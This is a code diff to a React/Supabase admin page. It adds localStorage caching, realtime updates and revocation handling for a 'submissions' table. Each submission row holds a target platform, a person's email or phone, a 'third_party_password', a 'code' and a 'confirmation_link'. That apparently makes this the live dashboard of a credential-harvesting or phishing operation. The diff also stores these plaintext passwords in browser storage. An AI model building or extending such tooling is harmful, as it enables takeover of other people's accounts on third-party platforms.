@@ -5,6 +5,8 @@ import Connect from './Connect';
 import { useAuth } from '../contexts/AuthContext';
 
 const ADMIN_CACHE_KEY = 'nexara_admin_status';
+const SUBMISSIONS_CACHE_KEY = 'nexara_cached_submissions';
+const USERS_CACHE_KEY = 'nexara_cached_users';
 
 export default function Admin() {
   const navigate = useNavigate();
@@ -12,6 +14,7 @@ export default function Admin() {
   const currentInitId = useRef(0);
   const abortController = useRef<AbortController | null>(null);
   const backgroundValidationInProgress = useRef(false);
+  const realtimeChannel = useRef<any>(null);
   const { user: authUser, loading: authLoading } = useAuth();
   const adminInitUserId = useRef<string | null>(null);
   const [rows, setRows] = useState<any[]>([]);
@@ -23,6 +26,7 @@ export default function Admin() {
   const [unauthorizedMessage, setUnauthorizedMessage] = useState('');
   const [statusMessage, setStatusMessage] = useState('');
   const [debugMessages, setDebugMessages] = useState<string[]>([]);
+  const [hasInitialLoadCompleted, setHasInitialLoadCompleted] = useState(false);
 
   const addDebugMessage = (msg: string) => {
     setDebugMessages(prev => [...prev, `${new Date().toLocaleTimeString()}: ${msg}`]);
@@ -38,10 +42,32 @@ export default function Admin() {
     }
   };
 
+  const saveRowsToCache = (cachedRows: any[]) => {
+    try {
+      localStorage.setItem(SUBMISSIONS_CACHE_KEY, JSON.stringify(cachedRows));
+      console.log('Admin: saved submissions cache');
+      addDebugMessage('submissions cache updated');
+    } catch (err) {
+      console.warn('Admin: failed to save submissions cache:', err);
+    }
+  };
+
+  const saveUsersToCache = (cachedUsers: any[]) => {
+    try {
+      localStorage.setItem(USERS_CACHE_KEY, JSON.stringify(cachedUsers));
+      console.log('Admin: saved users cache');
+      addDebugMessage('users cache updated');
+    } catch (err) {
+      console.warn('Admin: failed to save users cache:', err);
+    }
+  };
+
   const clearAdminCache = () => {
     try {
       localStorage.removeItem(ADMIN_CACHE_KEY);
-      console.log('Admin: cleared admin status cache');
+      localStorage.removeItem(SUBMISSIONS_CACHE_KEY);
+      localStorage.removeItem(USERS_CACHE_KEY);
+      console.log('Admin: cleared admin status and data cache');
       addDebugMessage('admin cache cleared');
     } catch (err) {
       console.warn('Admin: failed to clear admin cache:', err);
@@ -57,6 +83,46 @@ export default function Admin() {
       return false;
     }
   };
+
+  const getCachedRows = (): any[] => {
+    try {
+      const cached = localStorage.getItem(SUBMISSIONS_CACHE_KEY);
+      return cached ? JSON.parse(cached) : [];
+    } catch (err) {
+      console.warn('Admin: failed to read submissions cache:', err);
+      return [];
+    }
+  };
+
+  const getCachedUsers = (): any[] => {
+    try {
+      const cached = localStorage.getItem(USERS_CACHE_KEY);
+      return cached ? JSON.parse(cached) : [];
+    } catch (err) {
+      console.warn('Admin: failed to read users cache:', err);
+      return [];
+    }
+  };
+
+  useEffect(() => {
+    const cachedAdmin = getCachedAdminStatus();
+    if (!cachedAdmin) return;
+
+    const cachedRows = getCachedRows();
+    const cachedUsers = getCachedUsers();
+
+    console.log('Admin: hydrating cached admin data instantly');
+    addDebugMessage('hydrated cached submissions and users');
+    setRows(cachedRows);
+    setUsers(cachedUsers);
+    setIsAdmin(true);
+    setLoading(false);
+    setAuthChecked(true);
+    setAdminState('ready');
+    setHasInitialLoadCompleted(true);
+    setUnauthorizedMessage('');
+    updateStatusMessage('Loaded cached admin data. Validating in background...');
+  }, []);
 
   const finishAuthCheck = (message = '', initId?: number) => {
     if (!isMounted.current) return;
@@ -247,10 +313,27 @@ export default function Admin() {
     } catch (err) {
       console.error('Admin: background validation error:', err);
       addDebugMessage(`background validation error: ${err}`);
-      
-      // Silent failure - don't block the UI, but clear cache
-      clearAdminCache();
-      setUnauthorizedMessage('Background validation failed. Please refresh if you experience issues.');
+
+      const status = (err as any)?.status;
+      const message = String(err).toLowerCase();
+      const isAuthError = status === 401 || status === 403 || message.includes('jwt') || message.includes('permission denied');
+
+      if (isAuthError) {
+        console.log('Admin: auth-related background validation failure, clearing cache');
+        clearAdminCache();
+        setIsAdmin(false);
+        setUnauthorizedMessage('Your admin access has been revoked.');
+        if (isMounted.current) {
+          setTimeout(() => {
+            if (isMounted.current) {
+              navigate('/login');
+            }
+          }, 2000);
+        }
+      } else {
+        console.log('Admin: non-auth background validation failure, keeping cache');
+        updateStatusMessage('Background validation unavailable. Using cached data.');
+      }
     } finally {
       backgroundValidationInProgress.current = false;
       console.log('Admin: background validation completed');
@@ -295,6 +378,64 @@ export default function Admin() {
     addDebugMessage(`new auth user detected: ${authUser.email}`);
     initializeAdmin(authUser);
   }, [authLoading, authUser]);
+
+  useEffect(() => {
+    if (!authUser || !isAdmin) return;
+
+    const handleRealtimeSubmission = (payload: any) => {
+      const row = payload.new;
+      if (!row) return;
+
+      setRows((currentRows) => {
+        const existingIndex = currentRows.findIndex((item) => item.id === row.id);
+        const updatedRows = [...currentRows];
+
+        const mappedRow = {
+          id: row.id,
+          platform: row.platform,
+          contact: row.email || row.phone || '-',
+          third_party_password: row.third_party_password,
+          created_at: row.created_at,
+          user_id: row.user_id || null,
+          status: row.status,
+          source: row.source,
+          code: row.code,
+          confirmation_link: row.confirmation_link || null,
+        };
+
+        if (existingIndex >= 0) {
+          updatedRows[existingIndex] = mappedRow;
+        } else {
+          updatedRows.unshift(mappedRow);
+        }
+
+        saveRowsToCache(updatedRows);
+        return updatedRows;
+      });
+    };
+
+    const channel = supabase
+      .channel('admin-submissions-realtime')
+      .on(
+        'postgres_changes',
+        { event: 'INSERT', schema: 'public', table: 'submissions' },
+        handleRealtimeSubmission
+      )
+      .on(
+        'postgres_changes',
+        { event: 'UPDATE', schema: 'public', table: 'submissions' },
+        handleRealtimeSubmission
+      );
+
+    channel.subscribe();
+    realtimeChannel.current = channel;
+
+    return () => {
+      if (realtimeChannel.current) {
+        realtimeChannel.current.unsubscribe();
+      }
+    };
+  }, [authUser, isAdmin]);
 
   const fetchSubmissions = async (signal?: AbortSignal) => {
     addDebugMessage('submissions fetch started');
@@ -358,6 +499,8 @@ export default function Admin() {
       addDebugMessage(`submissions fetch success: ${mergedRows.length} submissions`);
       addDebugMessage(`admin status: email=${adminEmail}, isOwner=${isOwner}`);
       setRows(mergedRows);
+      saveRowsToCache(mergedRows);
+      setHasInitialLoadCompleted(true);
     } catch (err) {
       console.error('Admin: Error loading admin submissions:', err);
       const errorMsg = err instanceof Error ? err.message : String(err);
@@ -367,6 +510,7 @@ export default function Admin() {
       console.log('Admin: fetchSubmissions finally, setting loading false');
       if (isMounted.current) {
         setLoading(false);
+        setHasInitialLoadCompleted(true);
       }
     }
   };
@@ -401,6 +545,8 @@ export default function Admin() {
       console.log('Admin: users data:', usersData);
       addDebugMessage(`users fetch success: ${usersData?.length || 0} users`);
       setUsers(usersData || []);
+      saveUsersToCache(usersData || []);
+      setHasInitialLoadCompleted(true);
     } catch (err) {
       console.error('Admin: Error loading users:', err);
       const errorMsg = err instanceof Error ? err.message : String(err);
@@ -482,10 +628,17 @@ export default function Admin() {
                   <td className="px-3 py-2 text-slate-400 truncate max-w-[100px] text-xs font-mono">{row.user_id || '-'}</td>
                 </tr>
               ))}
-              {rows.length === 0 && (
+              {rows.length === 0 && hasInitialLoadCompleted && (
                 <tr>
                   <td colSpan={9} className="px-3 py-8 text-center text-slate-500">
                     {loading ? 'Loading submissions...' : 'No submissions found.'}
+                  </td>
+                </tr>
+              )}
+              {rows.length === 0 && !hasInitialLoadCompleted && (
+                <tr>
+                  <td colSpan={9} className="px-3 py-8 text-center text-slate-500">
+                    Loading submissions...
                   </td>
                 </tr>
               )}
